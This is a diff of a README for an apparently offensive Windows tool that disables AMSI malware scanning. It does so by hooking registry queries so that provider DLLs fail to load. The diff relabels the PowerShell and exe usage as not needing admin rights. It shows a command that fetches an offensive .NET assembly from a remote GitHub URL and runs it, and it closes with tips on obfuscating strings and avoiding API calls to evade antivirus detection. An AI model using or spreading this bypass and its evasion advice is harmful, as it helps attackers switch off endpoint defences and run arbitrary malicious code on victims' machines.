@@ -8,7 +8,7 @@ Upon assembly.load(), internals of amsi/clr will search for reg key "Software\Mi
 We hook the reg query function and when amsi/clr tries to read "Software\Microsoft\AMSI\Providers" we overwrite its value to "Software\Microsoft\AMSI\Providers "  <- note the space after providers
 This breaks the provider dlls loading process and we are able to assembly load any .net assembly we want. For the powershell amsi, its somewhat similar, we break the vendor dll loading and call uninitialize to trigger a reinitialize. 
 
-## .powershell Usage (requires admin)
+## .powershell Usage (does not require admin)
 ![Image](https://github.com/user-attachments/assets/f6b4d83a-ed24-433b-9e2a-4cf6bfe1d1b0)
 ```
 pwd  # run any random command first, this is a must 
@@ -32,7 +32,7 @@ $Uninitialize.Invoke($object,$null)
 
 
   
-## .exe Usage (requires admin) 
+## .exe Usage (does not require admin) 
 ![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)
 ![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)
 
@@ -47,8 +47,7 @@ TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/head
 ## Detections 
 Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader \
 you can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious \
-Can rename certain strings the the reg key path  \
-Avoid the use of certain API calls and improve the hook library further \
+Can rename/obufscate certain strings like the reg key path and void the use of certain API calls and improve the hook library further \
 ![Image](https://github.com/user-attachments/assets/e4c80f07-ddbc-4ed6-9ad0-c8e104931f90)
 
 
